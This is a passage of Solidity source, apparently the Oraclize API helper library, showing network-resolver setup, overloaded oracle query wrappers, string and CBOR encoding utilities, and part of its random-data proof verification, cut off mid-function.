OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0))\n oraclize_setNetwork(networkID_auto);\n if(address(oraclize) != OAR.getAddress())\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n return oraclize_setNetwork();\n networkID;\n }\n function oraclize_setNetwork() internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) public {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) public {\n return;\n myid; result; proof;\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal pure returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal pure returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal pure returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal pure returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal pure returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal pure returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal pure returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal pure returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal pure returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal pure returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n function stra2cbor(string[] arr) internal pure returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n function ba2cbor(bytes[] arr) internal pure returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal view returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n require((_nbytes > 0) && (_nbytes <= 32));\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes[3] memory args = [unonce, nbytes, sessionKeyHash];\n bytes32 queryId = oraclize_query(_delay, \"random\", args, _customGasLimit);\n oraclize_randomDS_setCommitment(queryId, keccak256(bytes8(_delay), args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(keccak256(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(keccak256(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = byte(1);\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n require((_proof[0] == \"L\") && (_proof[1] == \"P\") && (_proof[2] == 1));\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n require(proofVerified);\n _;\n }\n function oraclize_randomDS_proofVerify__returnCode(bytes32 _queryId, string _result, bytes _proof) internal returns (uint8){\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) return 1;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) return 2;\n return 0;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix, uint n_random_bytes) internal pure returns (bool){\n bool match_ = true;\n for (uint256 i=0; i< n_random_bytes; i++) {\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n if (!(keccak256(keyhash) == keccak256(sha256(context_name, queryId)))) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, 